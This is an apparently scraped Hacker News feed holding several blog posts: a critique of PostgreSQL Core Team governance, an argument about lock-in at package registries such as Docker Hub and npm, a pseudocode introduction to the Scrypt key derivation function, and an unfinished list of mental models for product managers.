<p>On September 30th EnterpriseDB acquired 2ndQuadrant. At the time of the acquisition there were five members in Core; two of them were EnterpriseDB employees and another one a 2ndQuadrant employee. This meant that 60% of the Core members would be employed by EnterpriseDB. On October 20th, in an effort to diffuse concerns about a single commercial entity having majority control, the <a href="https://www.postgresql.org/about/news/statement-from-the-postgresql-core-team-on-the-edb-acquisition-of-2ndquadrant-2094/">Core Team announced</a> that this is an issue that they would be addressing:</p>
<p>“<em>There has long been an unwritten rule that there should be no more than 50% of the membership of the Core Team working for the same company</em>”</p>
<p>This rule was enacted back in the days of the <a href="https://www.postgresql.org/message-id/39181CCD.99531ADA@greatbridge.com">Great Bridge</a>. Core addressed the unwritten rule by appointing on November 2nd <a href="https://www.postgresql.org/about/news/new-postgresql-core-team-members-2103/">two new members: Andres Freund and Jonathan Katz</a>. This change in Core reduced the proportion of EnterpriseDB members to three out of seven. <strong>Fundación PostgreSQL</strong> would like to extend a very warm welcome to Andres and Jonathan. They are both well known and long time community contributors.</p>
<p>The addition of the new members allowed Core to be compliant with the 50% rule. However: was this organizational change the best choice? Was it the only change that could have been implemented? Could we have looked at the culture of our global community and used this opportunity to strengthen our ties?</p>
<p>Here are some facts about Core’s structure and membership:</p>
<ul>
<li><strong>Company influence</strong>:
<ul>
<li>Core has switched from having 40% of its members from a single company to now having 43% from a single company and 71% from two companies.</li>
<li>100% of the members are from only 4 companies.</li>
</ul>
</li>
<li><strong>Diversity</strong>:
<ul>
<li>100% of the current Core team members are white men.</li>
<li>All of the Core members are either US or European. No other region is represented.</li>
<li>All but one Core member work for US companies.</li>
</ul>
</li>
<li><strong>Democracy:</strong>
<ul>
<li>Core members are only appointed by existing Core members. In contrast, the “<a href="https://www.postgresql.org/community/recognition/#npos">Recognised Postgres Nonprofit Organisations</a>” (created and enforced by Core) has as a requirement that the “<em>board of directors MUST be elected by the membership</em>”. These rules were, in turn, created by Core itself.</li>
<li>Core members serve for an <em>unlimited</em> term. In contrast, the same Community recognition rules above also require that “<em>Lifetime directorships MUST NOT be allowed</em>”. Four of the current Core members <a href="https://web.archive.org/web/20051023004218/http://www.postgresql.org/developer/bios">have been serving in the Core team for more than 15 years</a>.</li>
</ul>
</li>
<li><strong>Transparency</strong>:
<ul>
<li>The election process, candidate selection, selection criteria, etc are all secret.</li>
<li>Core Team meeting minutes are secret.</li>
<li>Core team policies are enacted by declaration, without involvement of the global community.</li>
</ul>
</li>
</ul>
<p>Facts aside, there are some organizational concerns that may require some further analysis.</p>
<p>In the PostgreSQL distributed community, the <a href="https://www.postgresql.org/developer/core/">Core Team</a> acts as the <em>de facto</em> “central authority” for the project. The <a href="https://www.postgres.ca/">Postgres Association of Canada</a> (“CA”, in short), acts as its legal arm, holding assets (including intellectual property, like domain names and trademarks).</p>
<p>However, this presents an interesting dichotomy: Core makes decisions, but if these require a legal entity to be executed, they are executed by CA. Which has its own board of directors, that needs to approve them. What if they don’t? What if they don’t follow Core? Similarly, how is Core accountable, if it is not backed directly by a legal entity? Because of this, are there any potential liabilities faced directly by their members, as individuals? And what happens if CA’s Board goes haywire?</p>
<p>Other mature and successful open source projects, while distributed as Postgres and built from the contributions of people and organizations all around the world, are nowadays backed by clear and strong legal and organizational structure. Take for example the <a href="https://www.apache.org/foundation/">Apache Foundation</a>, or the <a href="https://www.fsf.org/working-together/fiscal-sponsorship">Free Software Foundation</a>. Or the <a href="https://www.cncf.io/">Cloud Native Computing Foundation (CNCF)</a>, which is a Charter of the Linux Foundation. Its structure <a href="https://www.cncf.io/blog/2019/12/06/cncf-toc-governance-structure-elections-2020/">has three main bodies</a>:</p>
<p>“<em>A <strong>Governing Board (GB)</strong> that is responsible for marketing, budget and other business oversight decisions for the CNCF, a <strong>Technical Oversight Committee (TOC)</strong> that is responsible for defining and maintaining the technical vision, and an <strong>End User Community (EUC)</strong> that is responsible for providing feedback from companies and startups to help improve the overall experience for the cloud native ecosystem</em>”</p>
<p>The <a href="https://www.cncf.io/people/governing-board/">Governing Board has currently 24 members</a>, and their <a href="https://www.cncf.io/about/governing-board-meeting-minutes/">meeting minutes are public</a> (they are not alone: MariaDB Foundation <a href="https://mariadb.org/bodminutes/2020-10-21/">is now publishing their board meetings too</a>); the <a href="https://www.cncf.io/people/technical-oversight-committee/">Technical Committee consists of 11 members and 77 contributors</a>; the <a href="https://docs.google.com/presentation/d/194SyKdHL7ws_DBOdbrXdowEJi54kIzDdDK_h-6Ag0uo/edit#slide=id.g9ffb40d42b_0_161">End User Community has more than 150 companies</a>; furthermore, there are dozens of <a href="https://www.cncf.io/people/ambassadors/">ambassadors</a>; and also dozens of <a href="https://www.cncf.io/people/staff/">staff</a> members. While possibly operating at a different scale than PostgreSQL, they all contribute, in different manners, to the steering, development and vision of the CNCF.</p>
<p>What do you think? <strong>Is PostgreSQL Core today what the PostgreSQL Community needs, or is it time to modernize its processes, structure and governance?</strong> If you think it is the latter, please leave your comments below. I hope this post serves as the starting point for a broader and constructive discussion that can serve as feedback to Core. Let’s ensure the best future for our beloved open source database!</p>

                </div>
                
                    
                
            </div>
        </div>
    </div>
</section></div>]]>
            </description>
            <link>https://postgresql.fund/blog/is-it-time-to-modernize-postgresql-core/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059852</guid>
            <pubDate>Wed, 11 Nov 2020 16:39:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Are Package Registries Holding Open-Source Hostage?]]>
            </title>
            <description>
<![CDATA[
Score 91 | Comments 75 (<a href="https://news.ycombinator.com/item?id=25059755">thread link</a>) | @aviaviavi
<br/>
November 11, 2020 | https://about.scarf.sh/post/package-registries-and-open-source | <a href="https://web.archive.org/web/*/https://about.scarf.sh/post/package-registries-and-open-source">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>A few days ago, I received an email from Docker about a change I already knew was coming:<em>‍</em></p><blockquote><em>Docker will begin enforcing rate limits on container pulls for Anonymous and Free users.</em><br></blockquote><p>To many, this came as no surprise. For years, <a href="http://hub.docker.com/">Docker Hub</a> has offered free hosting of container images, which typically range in size from a few megabytes to many gigabytes. Docker workflows as a result use a <em>lot</em> of bandwidth, and that bandwidth costs money.<br></p><p>Should we OSS (open-source software)&nbsp;developers have to think about the business and financial models of the platforms we host our software on? In a perfect world, we wouldn't have to—but in the real world we very much do. The incentives between OSS maintainers and the registries they use are often misaligned.&nbsp;<br></p><p>Docker Hub, <a href="http://npmjs.com/">npm</a>, and other comparable registries are incentivized to create lock-in, even if it makes the product experience worse for their users and customers. This is especially true of the for-profit companies behind the registries, but we see similar issues from many of the not-for-profit registries. </p><p>Maintainers, on the other hand, are incentivized to choose the best product for their needs at the lowest cost, which depends on being able to switch providers when a better service comes on the market.&nbsp;<br></p><p>This situation is fundamentally at odds with the today's package management ecosystem, where immutability is paramount in order to achieve stability. We avoid breaking things at all costs, on principle, since OSS packages are the nuts and bolts of the software ecosystem, the internet, and thus society itself.<br></p><h6><strong>Mechanics of registry lock-in</strong><br></h6><p>The registry where you host your packages and containers might be free today, but if that changes later, as is the case now with Docker, you and your users might be stuck paying whatever price the vendor chooses to set. Your users might even agree to access your package without the rate limit, but<strong> </strong><em>you</em> will not be seeing any of that revenue. Access to your open-source software was effectively just sold for a profit, and you, the author of that software, were cut out of the transaction.<br></p><p>While you could in theory just host your software somewhere else, can you really do that without breaking things for your current users? If you maintain and distribute a popular Docker image, switching the package registry is likely difficult.<br></p><p>Currently, any image on Docker Hub is installable as:<br></p><div><pre><code>$ docker run org-name/image-name</code></pre></div><p><em>‍</em>If you decide later you actually want to move your container hosting somewhere else - let's say <a href="https://cloud.google.com/container-registry" target="_blank">Google Container Registry</a> for this example - the Docker client is reasonable and lets you pull down images by their URL:<br></p><div><pre><code>$ docker run gcr.io/org-name/image-name</code></pre></div><p><em>‍</em>The problem here is that once you've changed the URL to your images, all of your existing users will stop getting updates! Even worse, this can break builds or pipelines for your users whenever they hit the new rate limits, which are not under your control. </p><p>At the point where your container has a sizable user-base all going through one of the existing container registries, your lock-in is substantial. Moving platforms will be painful. The crux of the problem here is that <em>you</em> don't own the distribution channel. The registry is the&nbsp; first place the web traffic goes, and everything that happens after that is at <em>the registry vendor’s</em><strong> </strong>discretion and to their advantage, not yours.<br></p><h6><strong>Effects of registry lock-in</strong><br></h6><p>Some might respond: <em>"This still seems like more of a theoretical problem than a practical one."</em><br></p><p>There are several practical downstream effects of the misaligned incentive structures to open-source package hosting. One major effect of registry lock-in is that maintainers cannot access their usage data. The data that registries naturally collect from package downloads can be quite useful to maintainers in a myriad of ways, yet registries typically don't share anything beyond a download count. </p><p>Registries know where the downloads are coming from, the devices, the package versions, which other packages are installed alongside, and a whole lot more. Little to none that information is shared with maintainers. Thus, maintainers are effectively locked out from observing the usage traffic.&nbsp;<br></p><p>Why is this the case? It's not because developers don't ask for it (<a href="https://github.com/npm/npm/issues/279">https://github.com/npm/npm/issues/279</a>). It's because the registries have no incentive to do so. It would cost the registries money to build and maintain the features to provide this data. Some registries even claim that exposing this data publicly would incentivize maintainers to game the system. Meanwhile, the extreme levels of inertia in software distribution keep maintainers locked in. </p><p>The registries' demonstrated distrust of maintainers seems counterproductive in a space where there's opportunity to work together cooperatively. If registry incentives were aligned accordingly, a registry like npm, for instance, would be in a great position to empower maintainers to leverage their own distribution data to deliver the best software possible.<br></p><p>What makes npm’s particular scenario even worse is that they've made it so difficult to use a registry that is<em> not</em> npm. There's no way to pull a single package from an alternate registry without switching to that registry. Which makes it quite impossible to actually publish a widely used JavaScript package without putting it on npm.&nbsp;<br></p><p>Contrast this scenario to Docker: Docker Hub creates different tradeoffs that both help and harm OSS maintainers. They've loosened their grip on OSS maintainers by making it user-friendly to pull containers down from alternative registries besides Docker Hub. However, even if you switch away from Docker Hub, you're still jumping from one company to another. This is because, at the end of the day, the registries—not the maintainers—own the distribution URL. The power imbalance continues.<br></p><p>My argument is not intended to dismiss the efforts of the registries as a whole. Package registries serve an essential role in software distribution, and have collectively serviced billions upon billions of package downloads. They’ve made it easy for anyone in the world to interact with open-source, and as a result have helped push open-source forward. Astonishingly, they have, for most part, remained free to use! But as software continues to eat the world and the distribution of that software becomes more important, conflicting interests in this space become increasingly problematic.<br></p><h6><strong>Looking forward</strong><br></h6><p>How do we solve this? Ultimately, package registries need to align their incentives with those of maintainers. Registries should build products maintainers <em>want</em> to use rather than products they <em>have</em> to use.&nbsp;The entire OSS&nbsp;community can benefit. <br></p><p>Part of this means registries must be more intentional about giving maintainers back control over the distribution of their own software, even when it means the maintainers could take their packages elsewhere. As a community, we should be empowering maintainers to do their best work rather than constraining them to work within a specific&nbsp; platform or framework.&nbsp;<br></p><p>For the health of the open source ecosystem, it's critical to ensure that maintainers are not locked out from accessing the data about their own software distribution. Maintainers must be able to make data-informed decisions and treat distribution data as something that rightfully belongs to them, instead of just the registry providers.<br></p><p>Unfortunately, the current software distribution model works to cut maintainers out, making all downstream actions more difficult and strictly less informed. When we as a community decide to better align ourselves with open-source maintainers and build platforms to empower them, the result will be better software for the entire ecosystem.</p><p>Scarf is working on new tooling to address these problems, so stay tuned! Follow <a href="https://twitter.com/scarf_oss" target="_blank">@scarf_oss</a> on Twitter or subscribe below for periodic updates.<br></p></div></div></div></div>]]>
            </description>
            <link>https://about.scarf.sh/post/package-registries-and-open-source</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059755</guid>
            <pubDate>Wed, 11 Nov 2020 16:32:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Intro to the Scrypt Hash]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25059496">thread link</a>) | @lanecwagner
<br/>
November 11, 2020 | https://qvault.io/2020/07/25/very-basic-intro-to-the-scrypt-hash/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/07/25/very-basic-intro-to-the-scrypt-hash/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>Scrypt is a slow-by-design <a href="https://qvault.io/2020/01/01/very-basic-intro-to-hash-functions-sha-256-md-5-etc/">hash function</a> or more accurately, a <a href="https://qvault.io/2019/12/30/very-basic-intro-to-key-derivation-functions-argon2-scrypt-etc/">KDF</a> function. Simply put, the purpose of the Scrypt hash is to take some input data, and create a fingerprint of that data, but to do it very slowly. A common use-case is to take a password and create an n-bit private key, which is much longer and more secure. Here at <a href="https://app.qvault.io/">Qvault,</a> we use a similar KDF for securing user passwords.</p>



<p>For example, let’s pretend your password is <code>password1234</code>. By using Scrypt, we can extend that deterministically into a 256-bit key:</p>



<pre><code>password1234 -&gt; 
AwEEDA4HCwQFAA8DAwwHDQwPDwUOBwoOCQACAgUJBQ0JAAYNBAMCDQ4JCQgLDwcGDQMDDgMKAQsNBAkLAwsACA==</code></pre>



<p>That long 256-bit key can now be used as a private key to encrypt and decrypt data. For example, it could be the key in an <a href="https://qvault.io/2020/01/02/very-basic-intro-to-aes-256-cipher/">AES-256</a> cipher.</p>



<h2>Why Not Encrypt With The Password Directly?</h2>



<p>Most encryption algorithms, including AES-256, require that a key of sufficient length is used. By hashing the password, we can derive a longer, more secure, fixed-size key.</p>



<p>Furthermore, using a KDF like Scrypt provides additional benefits over a traditional hash function like <a href="https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/">SHA-2</a>:</p>



<ul><li>Computationally expensive and slow</li><li>Memory intensive (potentially several gigabytes of RAM is used to execute the hash)</li></ul>



<p>Often times <a href="https://qvault.io/2020/02/11/how-do-brute-force-attackers-know-they-found-the-key/">brute-force attackers</a> will try to break encryption by guessing passwords over and over until they get it right. AES-256 and SHA-2 are fast, so an attacker would be able to guess many passwords per second. By using a slow hashing function like Scrypt to derive a key, we can force the attacker to waste more resources trying to break in.</p>



<h2>Scrypt Step-by-Step</h2>



<p>Scrypt can be visualized by some psuedo-code:</p>



<pre><code lang="go">func Scrypt(
	passphrase, // string of characters to be hashed
	salt,  // random salt
	costFactor, // CPU/Memory cost, must be power of 2
	blockSizeFactor,
	parallelizationFactor, // (1..232-1 * hLen/MFlen)
	desiredKeyLen // Desired key length in bytes
) derivedKey {
	// we'll get to this
}</code></pre>



<p>Let’s go through the steps of converting those inputs into the desired <code>derivedKey</code></p>



<h3>1 – Define Blocksize</h3>



<pre><code lang="go">const blockSize = 128 * blockSizeFactor</code></pre>



<h3>2 – Generate Initial Salt</h3>



<p>Scrypt uses <a aria-label=" (opens in a new tab)" href="https://en.wikipedia.org/wiki/PBKDF2" target="_blank" rel="noreferrer noopener nofollow">PBKDF2</a> as a child key-derivation function. We use it to generate an initial salt. <code>PBKDF2</code> has the following signature:</p>



<pre><code lang="go">func PBKDF2(
	prf,
	password,
	salt,
	numIterations,
	desiredKeyLen
) derivedKey {}</code></pre>



<p>We use it as follows:</p>



<pre><code lang="go">const initialSalt = PBKDF2(HMAC-SHA256, passphrase, salt, 1, blockSize * parallelizationFactor)</code></pre>



<h3>3 – Mix Salt</h3>



<p>Next, we mix the salt. We split <code>initialSalt</code> into <code>splitSalt</code>, which is a 2D array of bytes. Each sub-array contains 1024 bytes</p>



<pre><code lang="go">splitSalt := [][1024]byte(initialSalt)
for i, block := range splitSalt {
	newBlock := roMix(block, costFactor)
	splitSalt[i] = newBlock
}</code></pre>



<p>Where <code>roMix</code> is the following function:</p>



<pre><code lang="go">func roMix(block, iterations){
	v := []
	x := block
	for i := 0; i &lt; iterations; i++ {
		v[i] = x
		x = blockMix(x)
	}
	for i := 0; i &lt; iterations; i++ {
		j := integerify(x) % iterations
		x = blockMix(x ^ v[j])
	}
	return x
}</code></pre>



<p><code>integerify</code> is defined by <a aria-label=" (opens in a new tab)" href="https://tools.ietf.org/html/rfc7914" target="_blank" rel="noreferrer noopener nofollow">RFC-7914</a> and <code>blockMix</code> is:</p>



<pre><code lang="go">func blockMix(block){
	r := len(block) / 128
	// split block into an array of 2r 64-byte chunks
	chunks := get2r64ByteChunks()

	x := chunks[len(chunks)-1]
	y := []
	for i := 0; i &lt; len(chunks); i++{
		x = salsa20-8(x ^ chunks[i])
		y[i] = x
	}
	return [y[0], y[2], ...y[2r-2], y[1], y[3], ...y[2r-1]]
}</code></pre>



<p><code>salsa20-8</code> is the 8-round version of the algorithm defined <a href="https://en.wikipedia.org/wiki/Salsa20" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">here</a>.</p>



<h3>4 – Finalize Salt</h3>



<p>Now <code>splitSalt</code> has been mixed in such a computationally exhausting way that we will call it an <code>expensiveSalt</code>. Expensive salt will be a single array of bytes, so we need to concatenate all the subarrays in <code>splitSalt</code>.</p>



<pre><code lang="go">expensiveSalt := append([], splitSalt...)</code></pre>



<h3>5 – Return Final KDF</h3>



<pre><code lang="go">return PBKDF2(HMAC-SHA256, passphrase, expensiveSalt, 1, desiredKeyLen)</code></pre>



<p>The final pseudocode for our top level function is as follows:</p>



<pre><code lang="go">func Scrypt(
	passphrase, // string of characters to be hashed
	salt,  // random salt
	costFactor, // CPU/Memory cost, must be power of 2
	blockSizeFactor,
	parallelizationFactor, // (1..232-1 * hLen/MFlen)
	desiredKeyLen // Desired key length in bytes
) derivedKey {
	const blockSize = 128 * blockSizeFactor

	const initialSalt = PBKDF2(HMAC-SHA256, passphrase, salt, 1, blockSize * parallelizationFactor)

	splitSalt := [][1024]byte(initialSalt)
	for i, block := range splitSalt {
		newBlock := roMix(block, costFactor)
		splitSalt[i] = newBlock
	}

	expensiveSalt := append([], splitSalt...)

	return PBKDF2(HMAC-SHA256, passphrase, expensiveSalt, 1, desiredKeyLen)
}</code></pre>



<p>Or, if you prefer, the pseudocode as defined by <a href="https://en.wikipedia.org/wiki/Scrypt" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">Wikipedia</a>:</p>



<pre><code lang="">Function scrypt
   Inputs:
      Passphrase:                Bytes    string of characters to be hashed
      Salt:                      Bytes    random salt
      CostFactor (N):            Integer  CPU/memory cost parameter - Must be a power of 2 (e.g. 1024)
      BlockSizeFactor (r):       Integer  blocksize parameter (8 is commonly used)
      ParallelizationFactor (p): Integer  Parallelization parameter. (1..232-1 * hLen/MFlen)
      DesiredKeyLen:             Integer  Desired key length in bytes
   Output:
      DerivedKey:                Bytes    array of bytes, DesiredKeyLen long

   Step 1. Generate expensive salt
   blockSize ← 128*BlockSizeFactor  //Length (in bytes) of the SMix mixing function output (e.g. 128*8 = 1024 bytes)

   Use PBKDF2 to generate initial 128*BlockSizeFactor*p bytes of data (e.g. 128*8*3 = 3072 bytes)
   Treat the result as an array of p elements, each entry being blocksize bytes (e.g. 3 elements, each 1024 bytes)
   [B0...Bp−1] ← PBKDF2HMAC-SHA256(Passphrase, Salt, 1, blockSize*ParallelizationFactor)

   Mix each block in B Costfactor times using ROMix function (each block can be mixed in parallel)
   for i ← 0 to p-1 do
      Bi ← ROMix(Bi, CostFactor)

   All the elements of B is our new "expensive" salt
   expensiveSalt ← B0∥B1∥B2∥ ... ∥Bp-1  //where ∥ is concatenation
 
   Step 2. Use PBKDF2 to generate the desired number of bytes, but using the expensive salt we just generated
   return PBKDF2HMAC-SHA256(Passphrase, expensiveSalt, 1, DesiredKeyLen);</code></pre>




		</div></div>]]>
            </description>
            <link>https://qvault.io/2020/07/25/very-basic-intro-to-the-scrypt-hash/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059496</guid>
            <pubDate>Wed, 11 Nov 2020 16:09:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mental Models for Product Managers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25059450">thread link</a>) | @laybak
<br/>
November 11, 2020 | https://informedpm.com/posts/mental-models | <a href="https://web.archive.org/web/*/https://informedpm.com/posts/mental-models">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><span>It is trendy to talk about mental models these days, especially in the tech industry. But really, it's just a fancy way of saying "useful ways of thinking".</span></p> <p><span>In this post, I present a collection of mental models that are most relevant to the work of product managers. Some of these are borrowed from other disciplines. And they can be valuable additions to your toolbox for dealing with complexity.</span></p> <p><span>I intend for these to be jumping-off points for further thinking and learning. And not an exhaustive list. For a general introduction to mental models, here is a </span> <a href="https://fs.blog/mental-models/" target="_blank"><span>useful article by Farnam Street</span></a> <span>.</span></p> <p><span>Let's get started.</span></p>  <p><h2><span>Part 1: Learning </span></h2></p> <p><h3><span>Ensemble of Models</span></h3></p> <p><span>All models are wrong because they simplify. They omit details. For this reason, we should not rely on any single model. Instead, a many-model approach allows you to explain more and avoid blindspots. This works because the wrongness in each model tends to cancel out.</span></p> <p><span>Charlie Munger, an investor who popularized mental models, advocates combining them in a "latticework of models". And in machine learning, </span> <a href="https://en.wikipedia.org/wiki/Ensemble_learning" target="_blank"><span>ensemble methods</span></a> <span> can be an effective approach. </span></p> <p><span>This is useful when considering the diverse perspectives and opinions of your stakeholders.</span></p>  <p><h3><span>Learning by Doing</span></h3></p> <p><span>Which mental models matter in which circumstances? Knowing that is the hard part. </span></p> <p><span>A lot of skills and knowledge are implicit. They are hard to codify, or even articulate. You won't find them in neatly packaged books or elegant theories. </span></p> <p><span>But you can hone your judgment by maintaining contact with reality. You can put in iterations, and let your learning compound over time.</span></p>  <p><h3><span>Bayesian Updating</span></h3></p> <p><span>We get new information all the time. Feedback from a customer, changes in the industry, unforeseen challenges etc.</span></p> <p><span>Bayes' theorem provides a mathematical approach to weigh the old hypothesis (the "prior", initial belief) and new evidence. Bayesian inference is widely applicable in many areas, including AI and machine learning. Fun fact, it is also effective for </span> <a href="https://en.wikipedia.org/wiki/Bayesian_search_theory" target="_blank"><span>finding missing aircrafts</span></a> <span>.</span></p> <p><span>Here is an engaging introductory video on the topic.</span></p> <div><p><iframe src="https://www.youtube.com/embed/HZGCoVF3YvM?title=0&amp;byline=0&amp;portrait=0" frameborder="0"></iframe></p></div>  <p><h3><span>Process vs Outcome</span></h3></p> <p><span>It is tempting to judge our decisions by the outcome. But good decisions can lead to bad outcomes. And vice versa.</span></p> <p><span>Having a good process with a good outcome is ideal. Whereas a bad process with a good outcome is just gambling with blind luck.</span></p> <p><span>One way to calibrate your decisions over time is to document your decisions in a </span> <a href="https://fs.blog/2014/02/decision-journal/" target="_blank"><span>decision journal</span></a> <span>. Good things to write down include the context for the decision, alternatives and the range of outcomes, what you expect to happen, and how you feel mentally and physically.</span></p>  <p><h3><span>Dumb Idea Paradox</span></h3></p> <p><span>Many of the big success stories sounded stupid. Red Bull is an expensive drink that tastes disgusting. Snapchat is an app for sending disappearing photos. </span></p> <p><span>In the book </span> <a href="https://www.amazon.com/Loonshots-Nurture-Diseases-Transform-Industries-ebook/dp/B07D2BKVQR" target="_blank"><span>Loonshots</span></a> <span>, Safe Bahcall gave examples of brilliant ideas that had to survive "the Three Deaths" before finally succeeding. He wrote, "In the real world, ideas are ridiculed, experiments fail, budgets are cut, and good people are fired for stupid reasons." Andrew Chen also wrote about this in </span> <a href="https://andrewchen.co/dumb-idea-paradox/" target="_blank"><span>Dumb Idea Paradox</span></a> <span>.</span></p>  <p><h3><span>Satisficing</span></h3></p> <p><span>We make decisions in a world of uncertainty, with incomplete and imperfect information. Certainty is an illusion. It is better to be vaguely right than precisely wrong. </span></p> <p><span>﻿</span> <a href="https://en.wikipedia.org/wiki/Satisficing" target="_blank"><span>Satisficing</span></a> <span> (satisfy + suffice), introduced by&nbsp;</span> <a href="https://en.wikipedia.org/wiki/Herbert_A._Simon" target="_blank"><span>Herbert A. Simon</span></a> <span>, is about making decisions that are not perfect, but good enough. You can satisfice either by finding optimal solutions for a simplified world, or satisfactory solutions for a realistic one.</span></p>  <p><h2><span>Part 2: Collaboration &amp; Execution</span></h2></p> <p><h3><span>Maker's Schedule. Manager's Schedule</span></h3></p> <p><span>Context switching is costly, especially for creative work. In </span> <a href="http://www.paulgraham.com/makersschedule.html" target="_blank"><span>Paul Graham's popular essay</span></a> <span>, he discussed the cost of meetings and interruptions:</span></p> <p><em>"When you're operating on the maker's schedule, meetings are a disaster. A single meeting can blow a whole afternoon, by breaking it into two pieces each too small to do anything hard in."</em></p> <p><span>It is important to recognize the nature of different types of work. This way we can get more focused time for deep work, for ourselves and for our team.</span></p>  <p><h3><span>Working Memory and Cognitive Load</span></h3></p> <p><span>﻿</span> <a href="https://en.wikipedia.org/wiki/Working_memory" target="_blank"><span>Working memory</span></a> <span> is basically </span> <em>"how much stuff you can think about at the same time"</em> <span>. Each of us has a limited capacity. The "</span> <a href="https://en.wikipedia.org/wiki/The_Magical_Number_Seven%2C_Plus_or_Minus_Two" target="_blank"><span>magic number</span></a> <span>" of objects an average human can hold in short-term memory is 7, plus or minus 2.</span></p> <p><span>In the workplace, there is a lot of information to process. And the sheer load can quickly overwhelm our working memory.</span></p> <p><span>This calls for building a system to work around this. It could mean regular follow-ups, reminders, repetition, and good note-taking and documentation.</span></p>  <p><h3><span>Circle of Competence</span></h3></p> <p><span>﻿</span> <a href="https://en.wikipedia.org/wiki/Circle_of_competence" target="_blank"><span>Circle of competence</span></a> <span> is a mental model developed by Warren Buffett and Charlie Munger. Here's how Buffett summarized it:</span></p> <p><em>"Know your circle of competence, and stick within it. The size of that circle is not very important; knowing its boundaries, however, is vital."</em></p> <p><span>Being clear about what you know and what you think you know can keep your hubris in check. It can also help you identify blind spots and areas of improvement. </span></p> <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/circle-of-competence.png"></p>  <p><h3><span>Batch Processing</span></h3></p> <p><span>Instead of completing tasks in the order that they come, you can often save time by grouping similar tasks together. It reduces costly context switching and interrupts by consolidating repetitive tasks that are not time-sensitive.</span></p> <p><span>This approach can be helpful in answering emails, reading news articles, processing customer feedback etc. As an added benefit, once you batch the tasks, they also tend to be easier to delegate or automate.</span></p> <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/batch-processing.png"></p>  <p><h3><span>Incentives</span></h3></p> <p><span>All living creatures respond to incentives. That is, the proverbial carrot and stick. Behaviours that are rewarded are reinforced.</span></p> <p><span>Knowing this helps us understand the true motivation of our partners, stakeholders, and even customers. This allows us to influence without direct power.</span></p>  <p><h3><span>Goodhart's Law</span></h3></p> <p><span>It is important to consider incentives when deciding measurements of success and metrics to focus on. </span></p> <p><span>Goodhart's Law was named after the economist Charles Goodhart. The general version, phrased by anthropologist Marilyn Strathern, states that "</span> <em>When a measure becomes a target, it ceases to be a good measure</em> <span>."
to be a good measure." </span></p> <p><span>It is possible that some stakeholders can "game the system" and artificially inflate metrics in ways that don't reflect customer value.</span></p> <p><span>We need to be careful about what to measure and consider the incentives of the individual stakeholders. </span></p>  <p><h3><span>Persuasion</span></h3></p> <p><span>To make change happen, persuasion is essential. I have compiled the models, principles, and tactics on this topic in a </span> <a href="https://informedpm.com/posts/persuasion-product-manager" target="_blank"><span>separate post</span></a> <span>. </span></p>  <p><h2><span>Part 3: Systems Thinking</span></h2></p> <p><span>Product managers routinely deal with complex systems. A product is a system of features, stakeholders, processes, customers, other players in the market, changing industry and economic trends etc.</span></p> <p><span>A system is more than the sum of its parts. Systems thinking allows us to better understand the interconnections of the different parts.</span></p>  <p><h3><span>Feedback Loops</span></h3></p> <p><span>A feedback loop is a closed chain of causal connections formed by routing an output of a system back as an input. </span></p> <p><span>Different feedback structures can produce drastically different behaviours. Balancing feedback loops lead to stability or an equilibrium. Whereas reinforcing feedback loops lead to exponential growth or collapses. </span></p> <p><span>Understanding the structure of the system helps us understand its behaviours.</span></p> <p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/General_Feedback_Loop.svg/330px-General_Feedback_Loop.svg.png"></p>  <p><h3><span>Flywheel</span></h3></p> <p><span>The "</span> <a href="https://www.jimcollins.com/article_topics/articles/the-flywheel-effect.html" target="_blank"><span>flywheel effect</span></a> <span>" is a concept developed by researcher Jim Collins. It is a special kind of feedback loop (positive/reinforcing). Push the flywheel. Accelerate momentum. Then repeat.</span></p> <p><span>It is said that Bezos considered Amazon's application of the flywheel concept to be its "secret sauce". </span></p> <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/Amazon%20flywheel.png"></p>  <p><h3><span>Non-Linearity</span></h3></p> <p><span>A linear relationship between two variables can be drawn on a chart with a straight line. In a non-linear relationship, the cause does not produce a proportional effect.     </span></p> <p><span>In a linear system, twice the push can produce twice the response. But in a nonlinear system, twice the push can produce the response squared, a sixth, or no response at all.</span></p> <p><span>For example, doubling the team headcount may yield 1.2X the output. Tripling the price may yield 10X the revenue. </span></p> <p><span>Many relationships in systems are non-linear. This is often a source of surprise. Beware of the trap of assuming (though more intuitive) linear relationships. </span></p>  <p><h3><span>Leverage Points </span></h3></p> <p><span>To get more of a desired outcome, we may have to change the structure of a system. There are leverage points in all systems, where the efforts you apply can yield disproportionate results. For instance, identifying and resolving a bottleneck in a process can be a force multiplier for your efforts.</span></p> <p><span>But as systems scientist </span> <a href="https://en.wikipedia.org/wiki/Donella_Meadows" target="_blank"><span>Donella Meadows</span></a> <span> pointed out, leverage points are often counter-intuitive. And there is no cheap way to mastering the art of identifying leverage points. Though in her book </span> <a href="https://www.amazon.com/Thinking-Systems-Primer-Donella-Meadows/dp/1603580557" target="_blank"><span>Thinking in Systems</span></a> <span>, she proposed a ranked list of leverage point candidates based on her experience. </span></p>  <p><h3><span>Second and Higher Order Effects</span></h3></p> <p><span>First-order effects are the direct consequences of an action. They tend to be immediate. They tend to be obvious. They tend to be static. Thinking in first-order effects often a dangerous over-simplification.</span></p> <p><span>In real life, each agent in the system can respond to changes. Second (and higher) order effects include the effects of subsequent actions. </span></p> <p><span>An example of first-order thinking would be to assume that 